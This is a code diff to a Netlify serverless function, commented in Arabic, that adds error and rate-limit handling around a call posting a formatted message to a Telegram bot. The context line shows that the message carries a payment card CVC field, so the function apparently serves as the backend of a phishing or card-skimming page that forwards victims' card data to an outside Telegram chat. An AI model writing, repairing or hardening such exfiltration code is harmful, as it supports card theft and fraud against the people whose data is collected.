@@ -175,47 +175,89 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
     }
     
     // إرسال الرسالة إلى تليجرام
-    const telegramResponse = await axios.post(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-      {
-        chat_id: CHAT_ID,
-        text: formattedMessage,
-        parse_mode: 'HTML'
-      },
-      {
-        timeout: 10000,
-        headers: { 'Content-Type': 'application/json' }
+    try {
+      const telegramResponse = await axios.post(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+          chat_id: CHAT_ID,
+          text: formattedMessage,
+          parse_mode: 'HTML'
+        },
+        {
+          timeout: 10000,
+          headers: { 'Content-Type': 'application/json' }
+        }
+      );
+      
+      if (telegramResponse.data.ok) {
+        return {
+          statusCode: 200,
+          headers,
+          body: JSON.stringify({
+            success: true,
+            message: 'تم إرسال الرسالة بنجاح',
+            message_id: telegramResponse.data.result.message_id,
+            environment: 'Netlify Functions',
+            rateLimit: {
+              remainingRequests: validation.rateLimit.remainingRequests,
+              resetTime: validation.rateLimit.resetTime
+            }
+          })
+        };
+      } else {
+        return {
+          statusCode: 500,
+          headers,
+          body: JSON.stringify({
+            error: 'فشل في إرسال الرسالة إلى تليجرام',
+            code: 'TELEGRAM_ERROR',
+            details: telegramResponse.data
+          })
+        };
       }
-    );
-    
-    if (telegramResponse.data.ok) {
-      return {
-        statusCode: 200,
-        headers,
-        body: JSON.stringify({
-          success: true,
-          message: 'تم إرسال الرسالة بنجاح',
-          message_id: telegramResponse.data.result.message_id,
-          environment: 'Netlify Functions',
-          rateLimit: {
-            remainingRequests: validation.rateLimit.remainingRequests,
-            resetTime: validation.rateLimit.resetTime
-          }
-        })
-      };
-    } else {
+    } catch (telegramError) {
+      console.error('خطأ في تليجرام:', telegramError.response?.data || telegramError.message);
+      
+      // معالجة خطأ Rate Limiting من تليجرام
+      if (telegramError.response?.status === 429) {
+        return {
+          statusCode: 429,
+          headers,
+          body: JSON.stringify({
+            error: 'تليجرام يتعرض لضغط عالي، حاول لاحقاً',
+            code: 'TELEGRAM_RATE_LIMIT',
+            details: 'Telegram is experiencing high load'
+          })
+        };
+      }
+      
       return {
         statusCode: 500,
         headers,
         body: JSON.stringify({
-          error: 'فشل في إرسال الرسالة إلى تليجرام',
-          code: 'TELEGRAM_ERROR'
+          error: 'خطأ في الاتصال بتليجرام',
+          code: 'TELEGRAM_ERROR',
+          details: telegramError.message
         })
       };
     }
     
   } catch (error) {
     console.error('خطأ في دالة Netlify:', error);
+    
+    // معالجة أخطاء JSON parsing
+    if (error instanceof SyntaxError) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({
+          error: 'بيانات JSON غير صحيحة',
+          code: 'INVALID_JSON',
+          details: error.message
+        })
+      };
+    }
+    
     return {
       statusCode: 500,
       headers,
